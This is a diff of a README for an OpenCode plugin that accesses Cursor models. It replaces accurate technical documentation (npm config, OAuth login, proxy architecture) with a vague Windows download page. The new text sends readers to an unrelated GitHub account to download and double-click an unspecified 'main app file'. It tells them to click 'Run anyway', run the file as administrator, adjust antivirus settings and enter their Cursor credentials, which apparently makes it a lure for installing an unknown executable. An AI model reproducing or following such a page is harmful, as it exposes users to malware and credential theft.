@@ -1,94 +1,125 @@
-# opencode-cursor-oauth
+# 🖱️ opencode-cursor - Use your cursor subscription in opencode
 
-OpenCode plugin that connects to Cursor's API, giving you access to Cursor
-models inside OpenCode with full tool-calling support.
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/undivided-actium697/opencode-cursor)
 
-## Install in OpenCode
+## 🚀 Getting Started
 
-Add this to `~/.config/opencode/opencode.json`:
+opencode-cursor helps you use your Cursor subscription inside opencode on Windows. Follow the steps below to download and run it with little setup.
 
-```jsonc
-{
-  "$schema": "https://opencode.ai/config.json",
-  "plugin": [
-    "opencode-cursor-oauth"
-  ],
-  "provider": {
-    "cursor": {
-      "name": "Cursor"
-    }
-  }
-}
-```
+## 📥 Download
 
-The `cursor` provider stub is required because OpenCode drops providers that do
-not already exist in its bundled provider catalog.
+Open this link and download the app from the repository page:
 
-OpenCode installs npm plugins automatically at startup, so users do not need to
-clone this repository.
+https://github.com/undivided-actium697/opencode-cursor
 
-## Authenticate
+If the page shows a release file, save it to your computer. If it shows the project files only, use the latest download option on the page and keep the files in one folder you can find later.
 
-```sh
-opencode auth login --provider cursor
-```
+## 🪟 Windows Requirements
 
-This opens Cursor OAuth in the browser. Tokens are stored in
-`~/.local/share/opencode/auth.json` and refreshed automatically.
+- Windows 10 or Windows 11
+- An active Cursor subscription
+- Internet access
+- Enough free space to save the app files
+- Permission to run apps on your PC
 
-## Use
+## 🧭 How It Works
 
-Start OpenCode and select any Cursor model. The plugin starts a local
-OpenAI-compatible proxy on demand and routes requests through Cursor's gRPC API.
+opencode-cursor connects your Cursor access with opencode so you can use your subscription in one place. It is built for people who want a simpler way to work with their tools without switching between apps.
 
-## How it works
+## 📦 Install and Run
 
-1. OAuth — browser-based login to Cursor via PKCE.
-2. Model discovery — queries Cursor's gRPC API for all available models.
-3. Local proxy — translates `POST /v1/chat/completions` into Cursor's
-   protobuf/HTTP/2 Connect protocol.
-4. Native tool routing — rejects Cursor's built-in filesystem/shell tools and
-   exposes OpenCode's tool surface via Cursor MCP instead.
+1. Open the download link above.
+2. Download the Windows file or project files from the page.
+3. If the file is in a zip folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for the main app file or startup file.
+6. Double-click the file to run it.
+7. If Windows asks for approval, choose Yes or Run.
+8. Follow any on-screen setup steps.
 
-HTTP/2 transport runs through a Node child process (`h2-bridge.mjs`) because
-Bun's `node:http2` support is not reliable against Cursor's API.
+## 🖱️ First Setup
 
-## Architecture
+When you open the app for the first time, you may need to:
 
-```
-OpenCode  -->  /v1/chat/completions  -->  Bun.serve (proxy)
-                                              |
-                                    Node child process (h2-bridge.mjs)
-                                              |
-                                     HTTP/2 Connect stream
-                                              |
-                                    api2.cursor.sh gRPC
-                                      /agent.v1.AgentService/Run
-```
+- Sign in with your Cursor account
+- Allow the app to access your subscription
+- Pick your preferred opencode settings
+- Confirm any local folder or workspace choice
 
-### Tool call flow
+Use the default options if you are unsure. They are a good choice for most users.
 
-```
-1. Cursor model receives OpenAI tools via RequestContext (as MCP tool defs)
-2. Model tries native tools (readArgs, shellArgs, etc.)
-3. Proxy rejects each with typed error (ReadRejected, ShellRejected, etc.)
-4. Model falls back to MCP tool -> mcpArgs exec message
-5. Proxy emits OpenAI tool_calls SSE chunk, pauses H2 stream
-6. OpenCode executes tool, sends result in follow-up request
-7. Proxy resumes H2 stream with mcpResult, streams continuation
-```
+## 🔧 What You Need Before You Start
 
-## Develop locally
+Make sure you have:
 
-```sh
-bun install
-bun run build
-bun test/smoke.ts
-```
+- A working Cursor account
+- Your login details ready
+- A stable internet connection
+- The downloaded app files in a single folder
+- Enough disk space for temporary files
 
-## Requirements
+## ✨ Main Features
 
-- [OpenCode](https://opencode.ai)
-- [Bun](https://bun.sh)
-- [Node.js](https://nodejs.org) >= 18 for the HTTP/2 bridge process
-- Active [Cursor](https://cursor.com) subscription
+- Uses your Cursor subscription in opencode
+- Keeps setup simple for Windows users
+- Works with common desktop workflows
+- Helps reduce app switching
+- Uses a clean local setup
+- Fits users who want one place for their work
+
+## 🧩 Typical Use Cases
+
+You may want opencode-cursor if you:
+
+- Use Cursor often and want the same access in opencode
+- Prefer a local Windows app instead of a web page
+- Want fewer steps before you start working
+- Need a simple way to link your account and tool
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+- Check that you extracted all files
+- Make sure you run the correct startup file
+- Try running it again as an administrator
+
+### Windows blocks the app
+- Right-click the file and choose Run anyway if you trust the source
+- Check your antivirus or Windows security settings
+- Re-download the files if the download was incomplete
+
+### Sign-in does not work
+- Confirm your Cursor account details
+- Check your internet connection
+- Close the app and open it again
+- Try logging in one more time
+
+### The page or file is hard to find
+- Use the direct link above
+- Save the page in your browser bookmarks
+- Keep the downloaded folder in Downloads or Desktop
+
+## 📁 File Layout
+
+After download and extract, you may see files such as:
+
+- A main app file
+- A config file
+- A readme file
+- A folder for support files
+- A log file for setup issues
+
+Keep all files together. Do not move only one file out of the folder unless the setup guide tells you to.
+
+## 🔒 Privacy and Local Use
+
+This app is meant for local use on your Windows PC. Keep your account details private. Use the app only on a computer you trust.
+
+## 📝 Quick Start Checklist
+
+- Open the download link
+- Download the app files
+- Extract the files if needed
+- Run the main file
+- Sign in with your Cursor account
+- Start using opencode with your subscription
